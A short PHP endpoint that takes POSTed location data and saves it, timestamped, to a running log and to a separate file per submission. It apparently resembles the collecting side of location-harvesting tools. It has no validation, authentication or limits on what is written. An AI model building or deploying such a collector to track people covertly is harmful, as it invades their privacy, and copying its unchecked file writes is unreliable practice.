<?php
$date = date('dMYHis');
$locationData = $_POST['location'] ?? '';

if (!empty($locationData)) {
    file_put_contents("location_log.txt", "Received Location Data [$date]:\n$locationData\n\n", FILE_APPEND);
    file_put_contents("location_$date.txt", $locationData);
}

exit();
?>